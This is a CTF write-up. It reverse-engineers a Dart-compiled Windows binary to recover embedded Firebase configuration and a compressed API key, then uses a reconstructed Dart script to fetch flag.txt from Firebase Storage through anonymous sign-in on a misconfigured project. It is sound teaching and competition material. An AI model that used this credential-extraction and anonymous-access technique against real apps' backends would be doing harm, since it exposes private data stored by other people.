# Writeup

This is a binary built in [Dart](https://dart.dev/) program. It's quite unique since the actual source code of the binary is converted inside a `.snapshot` segment. This makes sense since Dart AOT compilation goes to the snapshots according to the DartVM documentation.

Dumping the `ELF` snapshot will be easy, either manually parse or uses `capstone` or `pefile` library from Python/ directly through decompiler.

```python
import pefile

pe = pefile.PE('./fluttish.exe')
for sc in pe.sections:
	print(sc)

#dump snapshots
with open("dumped.elf","wb") as n:
	n.write(pe.sections[len(pe.sections)-1].get_data())
	n.close()
```

In the `main` section, there'll be a default asynchronous function.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // r14
  __int64 v4; // r15
  __int64 inited; // rax
  __int64 ContextStub; // rax
  __int64 ClosureStub; // rax
  __int64 v8; // rcx
  __int64 v9; // rax
  unsigned int v10; // er11
  __int64 v11; // rdx
  __int64 v12; // rcx
  __int64 v13; // rax
  unsigned int v14; // er11
  __int64 v16; // [rsp-8h] [rbp-18h]
  __int64 v17; // [rsp-8h] [rbp-18h]
  __int64 v18; // [rsp+0h] [rbp-10h] BYREF
  __int64 v19; // [rsp+8h] [rbp-8h]

  if ( (unsigned __int64)&v18 <= *(_QWORD *)(v3 + 56) )
    (*(void (__fastcall **)(int, const char **, const char **))(v3 + 568))(argc, argv, envp);
  v19 = AllocationStub__Future_211(argc, argv, *(_QWORD *)(v3 + 200));
  *(_QWORD *)(v19 + 15) = 0LL;
  inited = *(_QWORD *)(*(_QWORD *)(v3 + 128) + 2640LL);
  if ( inited == *(_QWORD *)(v4 + 39) )
    inited = Stub__iso_stub_InitLateStaticFieldStub(argc, argv, *(_QWORD *)(v4 + 143));
  *(_QWORD *)(v19 + 23) = inited;
  ContextStub = Stub__iso_stub_AllocateContextStub();
  v18 = ContextStub;
  *(_QWORD *)(ContextStub + 31) = v19;
  *(_QWORD *)(ContextStub + 39) = *(_QWORD *)(v3 + 216);
  *(_QWORD *)(ContextStub + 23) = 0LL;
  ClosureStub = Stub__iso_stub_AllocateClosureStub(argc, argv, ContextStub);
  *(_QWORD *)(v18 + 95) = ClosureStub;
  v16 = ClosureStub;
  asyncThenWrapperHelper();
  v8 = v18;
  *(_QWORD *)(v18 + 55) = v9;
  LOBYTE(v10) = *(_BYTE *)(v8 - 1);
  if ( (*(_BYTE *)(v3 + 64) & (v10 >> 2) & *(_BYTE *)(v9 - 1)) != 0 )
    sub_35E641();
  v17 = *(_QWORD *)(v8 + 95);
  asyncErrorWrapperHelper();
  v12 = v18;
  *(_QWORD *)(v18 + 63) = v13;
  LOBYTE(v14) = *(_BYTE *)(v12 - 1);
  if ( (*(_BYTE *)(v3 + 64) & (v14 >> 2) & *(_BYTE *)(v13 - 1)) != 0 )
    sub_35E641();
  (*(void (__fastcall **)(int, const char **, __int64))(*(_QWORD *)(v12 + 95) + 55LL))(argc, argv, v11);
  *(_QWORD *)(v18 + 39) = *(_QWORD *)(v3 + 208);
  return v19;
}
```

This can be indicated into one single line -> `void main() async {}`

The main logic of the code should be located in `main_0` function.

```c

 __int64 v3; // r14
  __int64 v5; // rcx
  int result; // eax
  __int64 v7[7]; // [rsp+0h] [rbp-88h] BYREF
  __int64 v8; // [rsp+A8h] [rbp+20h]

  v5 = *(_QWORD *)(v8 + 39);
  v7[2] = v5;
  if ( (unsigned __int64)v7 <= *(_QWORD *)(v3 + 56) )
    (*(void (__fastcall **)(int, const char **, const char **))(v3 + 568))(argc, argv, envp);
  __asm { jmp     r11 }
  return result;

```

Although the decompilation doesn't make any sense, this is because of the Dart stack frames, so a manual assembly reading is required, but perhaps if you have any ideas to tackle it, it'd be much better!

```

mov     [rcx+4Fh], rcx
mov     r10d, 0Ah
call    Stub__iso_stub_AllocateContextStub
mov     rcx, rax
mov     rax, [rbp+var_78]
mov     [rbp+var_80], rcx
mov     [rcx+0Fh], rax
mov     r10, [r15+2957h]
call    FirebaseDart_setup
mov     rbx, [r15+28Fh]
mov     r10d, 76h ; 'v'
call    Stub__iso_stub_AllocateArrayStub
mov     [rbp+var_88], rax
mov     r11d, 0F0h
mov     [rax+17h], r11
mov     r11d, 138h
mov     [rax+1Fh], r11
mov     r11d, 0Ah
mov     [rax+27h], r11
xor     r11d, r11d
mov     [rax+2Fh], r11
...
[SNIP]
...
call    Stub__iso_stub_AllocateGrowableArrayStub
mov     rcx, rax
mov     rax, [rbp+var_88]
mov     [rcx+17h], rax
mov     qword ptr [rcx+0Fh], 0
mov     qword ptr [rcx+0Fh], 76h ; 'v'
mov     rax, rcx
mov     rdx, [rbp+var_80]
mov     [rdx+17h], rax
mov     r11b, [rdx-1]
shr     r11d, 2
and     r11d, [r14+40h]
test    [rax-1], r11b
```
This can be interpreted into `FirebaseDart.setup()` with a declaration of a `List<int>` since there's a `Stub__iso_stub_AllocateArrayStub` (array `size(n)` allocation, but the actual size is `n / 2`) and those hardcoded values in the `List<int>` is a twice normal value. This is because Dart Small Integers (SMI) always set a LSB of `0`. So the first index shall be `0x78` instead of `0xf0` and so on.

An initialization of [Firebase](https://firebase.google.com/) indicates that the binary uses `Firebase` service, and perhaps stored something inside.

```
loc_3639E3:
push    qword ptr [r14+0C8h]
push    rcx
call    new_Uint8List_fromList
pop     rcx
pop     rcx
...
[SNIP]
...
mov     rdx, [r15+295Fh]
call    AllocationStub_ZLibCodec_6497
mov     rcx, rax
mov     eax, 6
mov     [rbp+var_88], rcx
mov     [rcx+0Fh], rax
mov     eax, 0Fh
mov     [rcx+27h], rax
mov     eax, 8
mov     [rcx+17h], rax
xor     eax, eax
mov     [rcx+1Fh], rax
mov     r11, [r14+0D8h]
mov     [rcx+2Fh], r11
call    _validateZLibStrategy
...
[SNIP]
...
loc_363A7E:
mov     rax, [rcx+1Fh]
push    [rbp+var_88]
push    rax
call    Codec_decode
pop     rcx
pop     rcx
mov     [rbp+var_88], rax
push    rax
xor     ecx, ecx
push    rcx
push    qword ptr [r14+0C8h]
push    qword ptr [r14+0C8h]
call    _StringBase_createFromCharCodes
```

Those `List<int>` values then will be decompressed by `zlib` Dart and stored inside a variable as a `String` data type. It'll be in a format of a **Google API Key** (AzIdb...).

```
call    AllocationStub_FirebaseOptions_6496
mov     rcx, rax
mov     rax, [rbp+var_88]
mov     [rcx+7], rax
mov     r11, [r15+2967h]
...
[SNIP]
...
push    rcx
mov     r10, [r15+197h]
call    Firebase_initializeApp
pop     rcx
mov     rcx, rax
mov     rax, [rbp+var_78]
mov     rdx, [rax+37h]
mov     rbx, [rax+3Fh]
push    rcx
push    rdx
push    rbx
call    _awaitHelper
```

Now, there's a `FirebaseOptions`. If we're referring from the [Dart Firebase Docs](https://pub.dev/documentation/firebase_dart/latest/firebase_core/FirebaseOptions-class.html), there will be a required config options before `Firebase` initializes the app handler.

```
The options used to configure a Firebase app.

await Firebase.initializeApp(
  name: 'SecondaryApp',
  options: const FirebaseOptions(
    apiKey: '...',
    appId: '...',
    messagingSenderId: '...',
    projectId: '...',
  )
);

The Constructors:
FirebaseOptions({required String apiKey, required String appId, required String? messagingSenderId, required String projectId, String? authDomain, String? databaseURL, String? storageBucket, String? measurementId, String? trackingId, String? deepLinkURLScheme, String? androidClientId, String? iosClientId, String? iosBundleId, String? appGroupId})
The options used to configure a Firebase app.
```

We can also see if you've tried to import the public Dart package.

```dart
//snipped options.dart content
const FirebaseOptions({
    required this.apiKey,
    required this.appId,
    required this.messagingSenderId,
    required this.projectId,
    this.authDomain,
    this.databaseURL,
    this.storageBucket,
    this.measurementId,
    this.trackingId,
    this.deepLinkURLScheme,
    this.androidClientId,
    this.iosClientId,
    this.iosBundleId,
    this.appGroupId,
  });
```
There should be the `apiKey`, `appId`, `messagingSenderId` (this can be empty, but not **null**), `projectId`. Yet we can also specific other parameter which derives from `projectId` like `databaseURL`, `storageBucket`, and `authDomain`.

We've retrieved the `apiKey` from the decompressed zlib `List<int>` before, now we're searching for the `appId`. Assume that those attributes are hardcoded, we'll find based on the characteristics. `appId` usually has an embedded specific app string, like `:android:`, `:ios:`, or `:web:`. You can take a reference from the [Firebase Project Structure](https://firebase.google.com/docs/projects/learn-more).

On the address of `00000000001114E0` from `.rodata` segment, you'll get `1:935358161708:android:80751a5a1242b6b3cd0289`. This indicates a valid `appId` from Android, as no other `appId` from iOS/web found.
The `projectId` is pretty much difficult to search since it can be anything, **but** we can leverage the search through:

* `databaseURL` -> with URL ends with `firebaseio.com`
* `storageBucket` -> with URL ends with `appspot.com` (optional, only if it exists, if it is then there's a project which stores "something" in `Firebase Storage`)
* `authDomain` -> with URL ends with `firebaseapp.com`

Those attributes generally **always** uses `projectId` as their prefix, so we can get it from there.
Luckily, they are all exist!

* `databaseURL` -> `https://gemastik-2023-fluttish-db.firebaseio.com`
* `storageBucket` -> `https://gemastik-2023-fluttish-db.appspot.com`
* `authDomain` -> `https://gemastik-2023-fluttish-db.firebaseapp.com`

We can confirm that the `projectId` is `gemastik-2023-fluttish-db`.

Back to the `main_0` function, we should be able to see the `Firebase` Auth instance.

```
push    qword ptr [r14+0C8h]
push    [rbp+arg_8]
call    new_FirebaseAuth_instanceFor
pop     rcx
pop     rcx
```
The Auth instance serves as an authenticator for the `Firebase` service, it has a lot of method and in this case, it'd be likely the binary still saves the email and the password from Vaints. That's why the binary keeps getting `Error` since the user is already unauthorized due to deactivated account blacklist (refer to the challenge's description once again).

Let's prove the hypothese by searching `vaints` or email TLD string related to the company or the common ones like `gmail`, `outlook` and etc. There's `vaints_ctf_god@fluttish.org` email here which indicates the binary uses Firebase Auth service with a method of `signInWithEmailAndPassword`. Traversing the `password` inside the binary would waste our time since although it'd be found, it won't work since the user is **unauthorized**.

We'll get back to this later. Now, there should be an object fetching done by Firebase Storage Instance since there's an appspot storage bucket.

```
loc_363E99:
mov     [rbp+var_40], rcx
mov     [rbp+var_48], rax
mov     rdx, [rax+3Fh]
push    rdx
mov     r10, [r15+197h]
call    FirebaseStorage_instanceFor
pop     rcx
```
We don't know the path of the object since the Storage may consists of a JSON-like structure containing `parent` and `child` node, but we do know from the description states there's a `flag.txt` which holds the masterkey. 
Finding it through the binary reveals that there's a `flag.txt` fetch. There's no prefix path appended so it's a direct `/flag.txt` storage object fetching.

Reconstructing it in `Dart` would be like this.

```dart
import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:firebase_dart/auth.dart';
import 'package:firebase_dart/core.dart';
import 'package:firebase_dart/database.dart';
import 'package:firebase_dart/implementation/pure_dart.dart';
import 'package:firebase_dart/storage.dart';

void main() async {
  FirebaseDart.setup();
  //from List<int> Stub Array Growable , and removed the LSB
  List<int> compressedData = [120,156,5,0,65,10,128,48,232,69,29,178,62,REDACTED];
  Uint8List compressedlist = Uint8List.fromList(compressedData);
  ZLibCodec codec = ZLibCodec();
  var decoded = String.fromCharCodes(codec.decode(compressedlist));

  var options = FirebaseOptions(
      appId: '1:935358161708:android:80751a5a1242b6b3cd0289',
      apiKey: decoded,
      messagingSenderId: '',
      databaseURL: 'https://gemastik-2023-fluttish-db.firebaseio.com',
      projectId: 'gemastik-2023-fluttish-db',
      storageBucket: "gemastik-2023-fluttish-db.appspot.com",
      authDomain: 'gemastik-2023-fluttish-db.firebaseapp.com'
      );

  var app = await Firebase.initializeApp(options: options);
  var auth = FirebaseAuth.instanceFor(app: app);
   try {
   UserCredential userCredential = await auth.signInWithEmailAndPassword(
    email: "vaints_ctf_god@fluttish.org",
    password: "we-dont-know-this-one-right?"
    );
  } catch(error){
      print('Error : {User is already not authorized anymore. Please report to admin of fluttish.org for further confirmation}');
  }
  var storage = FirebaseStorage.instanceFor(app: app);
  var ref = storage.ref().child('flag.txt');
  var m = await ref.getMetadata();
  var v = utf8.decode((await ref.getData(m.size))!);
  print('Flag : $v');
}
```

There **might** be a basic **security misconfiguration** in the Firebase Project, just like the Anonymous FTP login, we can try to login as anonymous through this project since `vaints` is not authorized anymore.

Replacing those `try-catch` with `await auth.signInAnonymously();` , and you'll successfully retrieved the content of `flag.txt` from `fluttish.org` company DB.